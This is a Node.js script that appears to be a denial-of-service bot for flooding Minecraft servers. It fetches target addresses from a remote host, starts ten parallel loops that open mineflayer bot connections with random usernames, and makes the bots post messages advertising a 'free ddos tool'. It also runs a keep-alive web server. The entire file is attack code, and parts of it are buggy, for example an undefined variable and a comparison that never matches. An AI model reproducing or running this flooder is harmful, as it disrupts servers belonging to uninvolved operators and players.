console.log("ok");
process.on('uncaughtException', function(err) {
});
var express = require('express');
var app = express();
app.get('/', function (req, res) {
  res.send('Hello World!');
});
app.listen(3000, function (req,res,next) {});
console.log("ok");
global.targets = ["0"];
const mineflayer = require('mineflayer');

function makeid(length) {
    var result = '';
    var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_';
    var charactersLength = characters.length;
    for ( var i = 0; i < length; i++ ) {
      result += characters.charAt(Math.floor(Math.random() * 
    charactersLength));
  }
  return result;
}

function atk(){
  var targets = global.targets;
  if (targets == ["0"]){
    setTimeout(function (){
      atk();
    },500);
    return;
  }
  var target = targets[Math.floor(Math.random() * body.length)];
  console.log(target);
  var targetip = target.split(":")[0];
  var targetport = target.split(":")[1];
  const bot = mineflayer.createBot({
    host: targetip,
    port: targetport,
    username: makeid(10)
  });
  bot.on('kicked', function(){bot.quit("attack by anondiscord.ml! free tool!");});
  bot.on('error', function(){bot.quit("attack by anondiscord.ml! free tool!");});
  bot.on('login', function(){bot.send("attack by anondiscord.ml! free ddos tool!");bot.quit("attack by anondiscord.ml! free tool!");});
  setTimeout(function (){
    atk(target);
  },30);
}


function uptime(){
  request('http://localhost:3000', (error, response, body) => {
    if( error !== null ){}
  });
  setTimeout(function (){
    uptime();
  },5000);
}


function gettarget(){
  request('https://anbn.attackblock.xyz/?mc', (error, response, body) => {
    if( error !== null ){}else{
      body = body.split(',');
      global.targets = body;
    }
    setTimeout(function (){
      gettarget();
    },10000);
  });
}

uptime();
gettarget();
setTimeout(function (){atk();},0);setTimeout(function (){atk();},0);setTimeout(function (){atk();},0);setTimeout(function (){atk();},0);setTimeout(function (){atk();},0);setTimeout(function (){atk();},0);setTimeout(function (){atk();},0);setTimeout(function (){atk();},0);setTimeout(function (){atk();},0);setTimeout(function (){atk();},0);
